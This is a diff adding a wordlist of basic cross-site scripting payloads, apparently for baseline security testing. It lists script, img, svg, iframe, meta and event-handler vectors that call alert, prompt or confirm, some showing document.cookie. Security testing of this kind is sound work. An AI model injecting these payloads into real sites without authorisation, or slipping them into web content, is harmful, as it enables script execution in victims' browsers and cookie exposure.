@@ -1,0 +1,75 @@
+# Basic XSS Payloads
+# Fundamental XSS vectors for baseline testing
+# These are well-known payloads that work in unprotected contexts
+
+# Classic script tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+
+# Script with various triggers
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+<script>throw new Error('XSS')</script>
+
+# Image tag with error handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img/src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+
+# SVG-based XSS
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=prompt(1)>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert('XSS')</script></svg>
+
+# Body tag exploitation
+<body onload=alert(1)>
+<body onload=prompt(1)>
+<body/onload=alert(1)>
+
+# Other HTML5 tags
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# Iframe variations
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert('XSS')">
+<iframe onload=alert(1)>
+
+# Object and embed tags
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# Link and style tags
+<link rel=stylesheet href=javascript:alert(1)>
+<style>*{background:url('javascript:alert(1)')}</style>
+
+# Form exploits
+<form action=javascript:alert(1)><input type=submit>
+<button formaction=javascript:alert(1)>X</button>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Additional event handlers
+<div onmouseover=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<div ondblclick=alert(1)>dblclick</div>
+<div onmouseenter=alert(1)>enter</div>
